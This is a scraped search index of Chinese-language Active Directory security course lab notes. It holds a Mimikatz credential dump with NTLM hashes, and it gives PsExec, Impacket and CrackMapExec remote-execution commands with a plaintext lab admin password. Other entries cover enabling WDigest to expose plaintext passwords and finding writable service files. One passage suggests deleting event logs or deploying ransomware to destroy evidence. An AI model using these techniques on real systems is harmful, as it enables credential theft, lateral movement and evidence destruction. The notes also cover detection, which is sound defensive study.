Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 10:19:22 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :\t[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :\twdigest :\t* Username : Administrator * Domain : kuma * Password : (null) kerberos :\t* Username : Administrator * Domain : KUMA.ORG * Password : (null) ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 16441076 (00000000:00fadef4) Session : Interactive from 1 User Name : administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 12:44:48 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :\t[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :\twdigest :\t* Username : Administrator * Domain : kuma * Password : (null) kerberos :\t* Username : administrator * Domain : KUMA.ORG * Password : (null) ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 14849757 (00000000:00e296dd) Session : Service from 0 User Name : DefaultAppPool Domain : IIS APPPOOL Logon Server : (null) Logon Time : 2023/9/3 09:44:12 SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 1299130 (00000000:0013d2ba) Session : Interactive from 1 User Name : bear Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/8/29 12:47:58 SID : S-1-5-21-306106713-2531972042-334329499-2101 msv :\t[00000003] Primary * Username : bear * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : 4057a0d0b94378dd03224e8b3d28a006 tspkg :\twdigest :\t* Username : bear * Domain : kuma * Password : (null) kerberos :\t* Username : bear * Domain : KUMA.ORG * Password : (null) ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 995 (00000000:000003e3) Session : Service from 0 User Name : IUSR Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/8/29 12:40:42 SID : S-1-5-17 msv :\ttspkg :\twdigest :\t* Username : (null) * Domain : (null) * Password : (null) kerberos :\tssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 997 (00000000:000003e5) Session : Service from 0 User Name : LOCAL SERVICE Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/8/29 12:40:39 SID : S-1-5-19 msv :\ttspkg :\twdigest :\t* Username : (null) * Domain : (null) * Password : (null) kerberos :\t* Username : (null) * Domain : (null) * Password : (null) ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 70138 (00000000:000111fa) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-90-0-1 msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 70109 (00000000:000111dd) Session : Interactive from 1 User Name : DWM-1 Domain : Window Manager Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-90-0-1 msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 996 (00000000:000003e4) Session : Service from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-20 msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 47346 (00000000:0000b8f2) Session : Interactive from 1 User Name : UMFD-1 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-96-0-1 msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 46297 (00000000:0000b4d9) Session : Interactive from 0 User Name : UMFD-0 Domain : Font Driver Host Logon Server : (null) Logon Time : 2023/8/29 12:40:38 SID : S-1-5-96-0-0 msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : DESKTOP-G95U93T$ * Domain : kuma.org * Password : maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 44132 (00000000:0000ac64) Session : UndefinedLogonType from 0 User Name : (null) Domain : (null) Logon Server : (null) Logon Time : 2023/8/29 12:40:37 SID : msv :\t[00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg :\twdigest :\tkerberos :\tssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/8/29 12:40:37 SID : S-1-5-18 msv :\ttspkg :\twdigest :\t* Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos :\t* Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp :\tcredman :\tcloudap :\t::: 可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限 "},{"id":224,"href":"/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/","title":"NTUSTISC - AD Note - Lab(遠端執行(RDP))","section":"Securities","content":" NTUSTISC - AD Note - Lab(遠端執行(RDP)) # [TOC]\nLecture Video: 2022/05/11 AD 安全 2 Background # What is EULA?\n終端使用者授權合約（英語：end-user license agreements，英文縮寫：EULA）是指軟體的開發者或發行者授權使用者使用特定軟體產品時的規定，大多私有軟體附帶此合約，如不接受則無法安裝。不過自由軟體則較少使用這個合約\nLab # 此Lab主要是要讓我們可以遠端執行其他人的電腦，當我們已經取得local admin時，但domain admin遲遲沒有出現，我們就需要多找幾台主機試看看，可不可以登入或是遠端連線，這樣從一台主機出發，多幾台主機一起蹲domain admin的機會就會變大，可能會有疑問，要怎麼知道其他電腦的密碼呢?如果這一間公司它沒有使用之前介紹過的LAPS密碼管理工具，而且又是委外管理，則很有可能會有多台主機的密碼都一樣，然後再用前面提到的多種密碼提取方法(Brute Force SAM/Password Spraying etc)，得到更多台主機的密碼，然後再利用Mimikatz之類的工具把lsass的info leak出來，就有可能得到domain admin的密碼\n==遠端執行(RDP)== # Linux / Kali # Tools xfreerdp $ sudo apt install freerdp2-x11 -y Libfreerdp 先到https://packages.debian.org/sid/libfreerdp-client2-2這個頁面看一下要下載哪一個版本，Kali是amd64 $ cd ~/Downloads $ wget http://ftp.tw.debian.org/debian/pool/main/f/freerdp2/libfreerdp-client2-2_2.10.0+dfsg1-1.1_amd64.deb Windows # Tools: Psexec.exe 微軟的遠端執行工具，具有微軟的簽章，第一次使用需要接受EULA $ PsExec.exe -i \\\\\u0026lt;Remote IP\u0026gt; -accepteula -u [\u0026lt;domain\u0026gt;]\\\u0026lt;Remote Username\u0026gt; -p \u0026lt;Remote Password\u0026gt; cmd ==How to use xfreerdp== # 網路上有很多文章和教學12，不過他們的情況和我們的狀況有點不一樣 :::success 使用條件：Win2016一定要打開，事先取得帳號的密碼 :::\nCheck Win10 IP $ ipconfig Windows IP 設定 乙太網路卡 Ethernet0: 連線特定 DNS 尾碼 . . . . . . . . : localdomain 連結-本機 IPv6 位址 . . . . . . . : fe80::e490:37a2:d10e:a709%5 IPv4 位址 . . . . . . . . . . . . : 192.168.222.129 子網路遮罩 . . . . . . . . . . . .: 255.255.255.0 預設閘道 . . . . . . . . . . . . .: 192.168.222.2 Connect $ xfreerdp /d:kuma.org /p:1qaz@WSX3edc /v:192.168.222.129 /u:administrator :::warning Libfreerdp不知道為甚麼，安裝都會失敗，而且網路上也沒有其他教學或資源，所以先skip，反正有xfreerdp可以用 :::\n==How to use PsExec== # $ PsExec.exe -i \\\\192.168.222.129 -accepteula -u kuma.org\\administrator -p 1qaz@WSX3edc cmd PsExec v2.43 - Execute processes remotely Copyright (C) 2001-2023 Mark Russinovich Sysinternals - www.sysinternals.com Microsoft Windows [版本 10.0.18363.592] (c) 2019 Microsoft Corporation. 著作權所有，並保留一切權利。 C:\\Windows\\system32\u0026gt;whoami kuma\\administrator :::danger 值得一提的是，PsExec或xfreerdp貌似無法登入bear的帳號，只能連線administrator的帳號 :::\n==How to detect PsExec== # Event ID: 7045 $\\to$ 必須在遭受遠端連線的主機開啟此event，因為相關特徵是只有被遠端的主機才會產生的行為 Reference # [Linux] 使用 xfreerdp 遠端登入 Windows 桌面\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nlinux版連RDP遠端桌面-xfreerdp\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":225,"href":"/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/","title":"NTUSTISC - AD Note - Lab(遠端執行(RDP)2)","section":"Securities","content":" NTUSTISC - AD Note - Lab(遠端執行(RDP)2) # [TOC]\nLecture Video: 2022/05/11 AD 安全 2 Background # NTUSTISC - AD Note - Lab(Password Spraying) 滲透測試的利器 - Impacket:\npython撰寫的內網滲透工具\nLab # ==遠端執行(RDP)2== # Kali-Linux Tools Impacket(Kali-Linux愛好者可使用的PsExec) # Set up \u0026amp; Install $ git clone https://github.com/fortra/impacket.git $ cd impacket $ conda activate py3.7 # Recommended to install it in conda $ pip3 install -r requirements.txt $ python3 setup.py install # Cheat-Sheet $ conda activate py3.7 $ proxychains psexec.py \u0026lt;username\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;ip\u0026gt; whoami CrackMapExec $ crackmapexec smb [IP] -u \u0026lt;username\u0026gt; -p \u0026lt;password --exec-method smbexec -x \u0026#39;\u0026lt;command\u0026gt;\u0026#39; exec-method支援以下方法: * mmcexec * smbexec * wmiexec * atexec ==How to use Impacket== # 感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具\n$ proxychains psexec.py kuma\\administrators:1qaz@WSX3edc@192.168.222.129 dir [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] DLL init: proxychains-ng 4.16 Impacket v0.12.0.dev1+20230928.173259.06217f05 - Copyright 2023 Fortra [proxychains] Strict chain ... 127.0.0.1:9050 ... timeout [-] [Errno Connection error (192.168.222.129:445)] [Errno 111] Connection refused ==How to use CrackMapExec== # 還記的之前的Lab(NTUSTISC - AD Note - Lab(Password Spraying))，有使用過這套工具，當時是為了做密碼揮灑的目的，不過考慮到psexec這個工具本質上就是爬到遠端的主機，然後開execve的process，並且跟他溝通，所以在這樣的前提下，就可以直接用CrackMapExec達到和psexec一樣的效果，畢竟兩者本質是做的事情差不多 :::spoiler Execution Result\n$ crackmapexec smb 192.168.222.129 -u administrator -p 1qaz@WSX3edc --exec-method smbexec -x \u0026#39;dir C:\\tools\u0026#39; SMB 192.168.222.129 445 DESKTOP-G95U93T [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False) SMB 192.168.222.129 445 DESKTOP-G95U93T [+] kuma.org\\administrator:1qaz@WSX3edc (Pwn3d!) SMB 192.168.222.129 445 DESKTOP-G95U93T [+] Executed command via smbexec SMB 192.168.222.129 445 DESKTOP-G95U93T ║╧║╨░╧ C ññ¬║║╧║╨¿Sª│╝╨┼╥íC SMB 192.168.222.129 445 DESKTOP-G95U93T ║╧║╨░╧º╟╕╣: C230-62CE SMB 192.168.222.129 445 DESKTOP-G95U93T SMB 192.168.222.129 445 DESKTOP-G95U93T C:\\tools ¬║Ñ╪┐² SMB 192.168.222.129 445 DESKTOP-G95U93T SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/17 ñUñ╚ 03:15 \u0026lt;DIR\u0026gt; . SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/17 ñUñ╚ 03:15 \u0026lt;DIR\u0026gt; .. SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/04 ñWñ╚ 12:57 \u0026lt;DIR\u0026gt; AccessChk SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/06/22 ñUñ╚ 02:58 1,379,216 accesschk.exe SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/08/28 ñUñ╚ 11:41 \u0026lt;DIR\u0026gt; BloodHound-master SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/08/27 ñWñ╚ 11:32 \u0026lt;DIR\u0026gt; BloodHound-win32-x64 SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/08/29 ñWñ╚ 01:24 \u0026lt;DIR\u0026gt; BloodHound-win32-x64-4.1.0 SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñWñ╚ 01:19 373,760 Certify.exe SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 02:39 1,137,664 DNSAdmin-DLL.dll SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/04 ñWñ╚ 10:02 443,650 Invoke-NinjaCopy.ps1 SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 04:50 \u0026lt;DIR\u0026gt; KDU-1.1.0 SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/17 ñUñ╚ 12:08 1,590 Kerberos-AS-REP.txt SMB 192.168.222.129 445 DESKTOP-G95U93T 2005/01/17 ñUñ╚ 05:23 22,528 KmdManager.exe SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 04:50 \u0026lt;DIR\u0026gt; mimikatz_trunk SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/08/27 ñWñ╚ 11:31 \u0026lt;DIR\u0026gt; neo4j-community-4.3.4 SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 04:51 \u0026lt;DIR\u0026gt; nopad SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/28 ñUñ╚ 11:09 27,136 PrintSpoofer64.exe SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/05 ñWñ╚ 11:51 \u0026lt;DIR\u0026gt; Procdump SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 05:08 \u0026lt;DIR\u0026gt; ProcessExplorer SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 05:08 \u0026lt;DIR\u0026gt; PSTools SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñWñ╚ 12:27 301,056 Rubeus.exe SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/04 ñUñ╚ 11:33 \u0026lt;DIR\u0026gt; Sysmon SMB 192.168.222.129 445 DESKTOP-G95U93T 2021/09/29 ñUñ╚ 04:50 \u0026lt;DIR\u0026gt; Windows-Kernel-Explorer-master SMB 192.168.222.129 445 DESKTOP-G95U93T 2023/09/06 ñWñ╚ 11:12 \u0026lt;DIR\u0026gt; Zip Folders SMB 192.168.222.129 445 DESKTOP-G95U93T 8 ¡╙└╔«╫ 3,686,600 ª∞ñ╕▓╒ SMB 192.168.222.129 445 DESKTOP-G95U93T 16 ¡╙Ñ╪┐² 16,192,659,456 ª∞ñ╕▓╒ÑiÑ╬ :::\nReference # "},{"id":226,"href":"/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/","title":"NTUSTISC - AD Note - Lab(錯誤配置)","section":"Securities","content":" NTUSTISC - AD Note - Lab(錯誤配置) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 提權方法 利用弱點 Hijack Token Guess Password 管理服務 錯誤配置 服務使用高權限執行且檔案權限配置錯誤，所以只要把這項服務替換成惡意程式，最後再利用前面提到的print operator重開機，就可以達到控制的目的 透過accesschk.exe找出有問題的地方 $ accesschk.exe \u0026lt;user\u0026gt; \u0026lt;path\u0026gt; For example $ accesschk.exe \u0026#34;Administrator\u0026#34; \u0026#34;C:\\Program Files\\\u0026#34; Accesschk v6.15 - Reports effective permissions for securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com RW C:\\Program Files Lab Time - 本地提權 # ==錯誤配置== # 找出low有存取權限的service檔案\n$ accesschk.exe \u0026#34;low\u0026#34; \u0026#34;C:\\tools\u0026#34; Accesschk v6.15 - Reports effective permissions for securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com RW C:\\tools\\AccessChk RW C:\\tools\\accesschk.exe RW C:\\tools\\AccessChk.zip RW C:\\tools\\BloodHound-master RW C:\\tools\\BloodHound-win32-x64 RW C:\\tools\\BloodHound-win32-x64-4.0.3.zip RW C:\\tools\\BloodHound-win32-x64-4.1.0 RW C:\\tools\\BloodHound-win32-x64-4.1.0.zip RW C:\\tools\\Certify.exe RW C:\\tools\\DNSAdmin-DLL.dll RW C:\\tools\\KDU-1.1.0 RW C:\\tools\\KmdManager.exe RW C:\\tools\\mimikatz_trunk RW C:\\tools\\neo4j-community-4.3.4 RW C:\\tools\\neo4j-community-4.3.4-windows.zip RW C:\\tools\\nopad RW C:\\tools\\openssl.zip RW C:\\tools\\PrintSpoofer64.exe RW C:\\tools\\Procdump RW C:\\tools\\ProcessExplorer RW C:\\tools\\PSTools RW C:\\tools\\Rubeus.exe RW C:\\tools\\Windows-Kernel-Explorer-master "},{"id":227,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/","title":"NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)","section":"Securities","content":" NTUSTISC - AD Note - Lab(顯示Mimikatz的明文) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 之前在進行mimikatz的實作時，會看到很多wdigest是(null)的情況，主要原因是windows的設定的問題，所以只要把設定改回來，就可以正常顯示了，主要是windows不主動存取明文密碼\nWhat is WDigest WDigest即摘要身份驗證，摘要身份驗證是一種質詢/響應協議，主要在WindowsServer2003中用於LDAP和基於Web的身份驗證。它利用超文本傳輸協議(HTTP)和簡單身份驗證安全層(SASL)交換進行身份驗證\n什麼是安全性識別碼？\n安全性識別碼可用來唯一識別安全性主體或安全性群組。 安全性主體可以代表可由作業系統驗證的任何實體，例如使用者帳戶、電腦帳戶，或在使用者或電腦帳戶的安全性內容中執行的執行緒或進程。\n每個帳戶或群組，或帳戶安全性內容中執行的每個進程，都有由授權單位發出的唯一 SID，例如 Windows 網域控制站。 SID 會儲存在安全性資料庫中。 系統會產生 SID，以識別建立帳戶或群組時的特定帳戶或群組。 當 SID 做為使用者或群組的唯一識別碼時，永遠不會再次用來識別其他使用者或群組。\nLab # ==顯示Mimikatz的明文== # 只要打開regedit，在電腦\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest可能會看到UseLogonCredential的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增 重開機 重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看\nResult 我挑了幾個SID一樣的結果來看 左邊的是新增config之前，右邊的是重開機之後，可以看到原本(null)的地方大部分都有被顯示出來\n"},{"id":228,"href":"/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/","title":"NTUSTISC - AD Note - 會後提及有用的工具","section":"Securities","content":" NTUSTISC - AD Note - 會後提及有用的工具 # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # EDR(Endpoint Detection and Response) # 端點偵測及回應 (EDR) 結合了即時的持續監控、端點資料蒐集，以及進階交叉關聯，來偵測並回應主機和端點連線的可疑活動。這套方法可讓資安團隊快速發掘並交叉分析各種活動來產生高可信度的偵測事件，並提供手動和自動化回應選項。\nEDR 解決方案會記錄端點上發生的所有活動和事件。某些廠商或許還會將這項服務延伸至任何與您網路相連的工作負載。然後，這些記錄 (或事件記錄檔) 可用來發掘原本不會被發現的資安事件。即時的監控可以更快偵測威脅，不讓威脅有機會擴散至使用者端點之外。\n其實就是把我們感興趣的log抓出來而已\nXDR(Extended detection and response) # XDR (延伸式偵測及回應) 可蒐集並自動交叉關聯涵蓋多個防護層的資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此可藉由資安分析來提供更快的威脅偵測，提升調查與回應時間。\nXDR 能打破資安產品之間的藩籬，採用一種全方位面面俱到的偵測及回應方法。XDR 可蒐集並透過交叉關聯涵蓋多個防護層的偵測事件與深入的活動資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此豐富的資料若能透過自動化分析，就能更快偵測威脅，同時也讓資安分析師擁有適當的工具可完成更多任務，並透過調查來採取更迅速的行動。 簡單來說EDR只能特定範圍或是單一產品上做到端點偵測，但XDR是能夠跨各個資安產品或是layer達到更全面的偵測以及比對事件的結果\nMDR(Managed Detection and Response) # 提供專業的資安人員來協助企業進行監控網路、分析事件、並且回應所遭遇的資安狀況如何做出對應的應變\n是一種服務 藉由資安專家的服務，提供及時、有效的處理，以避免損失擴大 將安全專業知識外包給專業的人員 分析警示當中潛藏的危險徵兆 如何滅證 # 只要讓windows保持預設值或是把event file砍掉就好了，因為windows10會記錄很多使用者的狀況，例如Quick Access的使用路徑或是使用者之前使用過的應用程式的縮圖等等，所以最暴力的方式是離開之前丟一個勒索病毒，它就會針對常見的file進行加密，這樣縱使不把東西刪掉，鑑識人員也不會知道裡面的內容是甚麼\n如果正在使用Win2008/2012 # 請趕快升級成Win2016，因為有很多攻擊手段是到win2016的就失效的，例如前面提到的wdigest在2008/2012是會開的，因為這樣在認證上才會成功\n什麼是誘捕系統（Honey Pot）？ # 就像是一罐用來吸引、捕捉昆蟲的蜂蜜，所謂的誘捕系統（Honey Pot）就是一個吸引攻擊者的目標，透過誘捕的手法，吸引駭客發動攻擊，以蒐集攻擊者的來源以及攻擊手法，現在除了應用在蒐集病毒特徵、攻擊手法，也用來蒐集假網站的IP，以及散布木馬或間諜程式等惡意來源名單，藉此觀察病蠕蟲、駭客入侵或惡意攻擊的來源、手段、管道及模式，由於會將所有攻擊動作與過程記錄下來，已經成為蒐集駭客資訊的重要方式之ㄧ。\n此外，誘捕系統還具有消耗攻擊時間、轉移攻擊目標等的功能。一個「接近真實」的誘補系統必須定期更新與維護，才能與駭客互動、吸引駭客長時間注意，除了提供詳盡的攻擊細節，研究人員必須觀察攻擊者的動機，並擬定因應對策，而系統也必須定期清除所遭受到的感染。\n什麼是SCCM? # Microsoft System Center Configuration Manager\n微軟系統中心配置管理器（Microsoft System Center Configuration Manager，英文縮寫SCCM，也稱為ConfigMgr），舊名系統管理服務（Systems Management Server，英文縮寫SMS），是由Microsoft開發的系統管理軟體。SCCM提供遠程控制，補丁程序管理，軟體分發，作業系統部署，網絡訪問保護以及羅列硬體和軟體詳細信息等功能。\n又甚麼是系統管理?\n系統管理可能涉及以下一項或多項任務： \u0026gt; * 硬體維護 \u0026gt; * 監視伺服器 \u0026gt; * 安裝軟體 \u0026gt; * 反病毒和反惡意軟體 \u0026gt; * 用戶活動監控 \u0026gt; * 安全管理。 \u0026gt; * 存儲管理 \u0026gt; * 網絡容量和利用率監視\nWhat is VNC(Virtual Network Computing)? # 就類似TeamViewer那樣的遠端連線工具，它是使用RFB(Remote Frame Buffer)的協定，通常linux系統預設是用VNC，啟動VNC的教學可以這邊12，兩者的比較可以看一下這邊3\nWhat is AAD(Azure Active Directory)? # Azure Active Directory (Azure AD) 是雲端式身分識別與存取管理服務。 Azure AD 可讓您的員工存取外部資源，例如 Microsoft 365、Azure 入口網站和數千個其他 SaaS 應用程式。 Azure Active Directory 也可協助他們存取內部資源，例如公司內部網路上的應用程式，以及為您自己的組織開發的任何雲端應用程式\n如果想知道AD和AAD之間的差異，可以看4 如果官方的太雜或太深可以先看這個影片[Azure]AD與AAD的區別是甚麼?，講的非常的清楚\nAzureAD不是AD的雲端版本\n原本本地端的AD就是一種樹系的分層控管結構，domain controller(Windows Server)會控管公司的每一台主機，或是分成區域、各種不同的domain(e.g. kuma.org)等等，而DC可以派發一些group policy達到控制底下的其他電腦，可能是安裝或卸載一些應用程式或是控制檔案的RWX的權限等等\n試想，現在這種本地端的AD內的computer如果想要用雲端服務，會很麻煩，首先\n不同的雲端服務都會需要不同的帳密，對於使用者來說會麻煩，要記很多組，如果都用同一組又會有資安上的風險 站在公司的立場也不好，因為如果使用者是用公司的帳號和密碼，萬一外部雲端服務的資料外洩，就會影響到公司內部的資安 如果員工離職，雖然可以刪除AD上的帳號，但是外部的雲端服務的帳號就很難刪除 站在雲端服務供應商的立場，也會很麻煩，因為每一次開發一個應用程式，都需要額外開發屬於自己應用程式的帳號認證或重製密碼的機制等等，會很繁瑣也很沒效率 所以基於以上需求和缺點，有了新的東西，也就是IdaaS(Identity as a 